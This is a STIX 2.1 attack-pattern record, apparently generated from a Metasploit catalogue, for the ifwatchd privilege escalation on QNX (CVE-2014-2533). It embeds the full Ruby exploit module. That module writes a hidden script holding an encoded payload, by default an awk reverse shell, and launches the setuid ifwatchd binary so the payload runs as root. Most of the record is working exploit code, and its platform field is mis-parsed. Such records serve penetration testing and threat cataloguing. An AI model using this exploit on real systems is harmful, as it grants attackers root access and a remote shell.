{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0ac4f0c1-9735-428e-aac2-3aba9c916acf",
    "created": "2024-08-14T16:56:54.581306Z",
    "modified": "2024-08-14T16:56:54.58131Z",
    "name": "ifwatchd Privilege Escalation",
    "description": " This module attempts to gain root privileges on QNX 6.4.x and 6.5.x systems by exploiting the ifwatchd suid executable.  ifwatchd allows users to specify scripts to execute using the '-A' command line argument; however, it does not drop privileges when executing user-supplied scripts, resulting in execution of arbitrary commands as root.  This module has been tested successfully on QNX Neutrino 6.5.0 (x86) and 6.5.0 SP1 (x86).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/qnx/local/ifwatchd_priv_esc.rb",
            "external_id": "ifwatchd_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-2533"
        },
        {
            "source_name": "reference",
            "url": "http://seclists.org/bugtraq/2014/Mar/66"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::Linux::Priv\n  include Msf::Post::File\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ifwatchd Privilege Escalation',\n        'Description' => %q{\n          This module attempts to gain root privileges on QNX 6.4.x and 6.5.x\n          systems by exploiting the ifwatchd suid executable.\n\n          ifwatchd allows users to specify scripts to execute using the '-A'\n          command line argument; however, it does not drop privileges when\n          executing user-supplied scripts, resulting in execution of arbitrary\n          commands as root.\n\n          This module has been tested successfully on QNX Neutrino 6.5.0 (x86)\n          and 6.5.0 SP1 (x86).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'cenobyte', # Discovery and exploit\n          'Tim Brown', # Independent discovery\n          'bcoles' # Metasploit\n        ],\n        'References' => [\n          ['CVE', '2014-2533'],\n          ['BID', '66449'],\n          ['EDB', '32153'],\n          ['URL', 'http://seclists.org/bugtraq/2014/Mar/66']\n        ],\n        'DisclosureDate' => '2014-03-10',\n        'Platform' => 'unix', # QNX\n        'Arch' => ARCH_CMD,\n        'SessionTypes' => %w[shell meterpreter],\n        'Targets' => [['Automatic', {}]],\n        'Privileged' => true,\n        'Payload' => {\n          'BadChars' => '',\n          'DisableNops' => true,\n          'Space' => 1024,\n          'Compat' => {\n            'PayloadType' => 'cmd',\n            'RequiredCmd' => 'gawk generic'\n          }\n        },\n        'DefaultOptions' => {\n          'WfsDelay' => 10,\n          'PAYLOAD' => 'cmd/unix/reverse_awk'\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => []\n        }\n      )\n    )\n    register_advanced_options([\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ])\n  end\n\n  def ifwatchd_path\n    '/sbin/ifwatchd'\n  end\n\n  def base_dir\n    datastore['WritableDir']\n  end\n\n  def check\n    return CheckCode::Safe(\"#{ifwatchd_path} is not setuid\") unless setuid?(ifwatchd_path)\n\n    CheckCode::Detected(\"#{ifwatchd_path} is setuid\")\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    fail_with(Failure::BadConfig, \"#{base_dir} is not writable\") unless writable?(base_dir)\n\n    script_path = \"#{base_dir}/.#{rand_text_alphanumeric(10..15)}\"\n\n    print_status('Writing interface arrival event script...')\n\n    cmd_exec \"echo '#!/bin/sh' > #{script_path}\"\n    cmd_exec \"echo 'PATH=/bin:/usr/bin' >> #{script_path}\"\n    cmd_exec \"echo 'IFWPID=$(ps -edaf | grep \\\"#{script_path}\\\" | awk \\\"!/grep/ { print $2 }\\\")' >> #{script_path}\"\n    exp = payload.encoded.gsub('\"', '\\\"').gsub('$', '\\$')\n    cmd_exec \"echo \\\"#{exp}\\\" >> #{script_path}\"\n    cmd_exec \"echo 'kill -9 $IFWPID' >> #{script_path}\"\n    register_file_for_cleanup(script_path)\n\n    cmd_exec(\"chmod +x '#{script_path}'\")\n\n    print_status(\"Executing #{ifwatchd_path}...\")\n    interface = 'lo0'\n    cmd_exec(\"#{ifwatchd_path} -A '#{script_path}' -v #{interface} >/dev/null & echo \")\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-03-10",
    "x_mitre_platforms": [
        "unix', # QNX"
    ]
}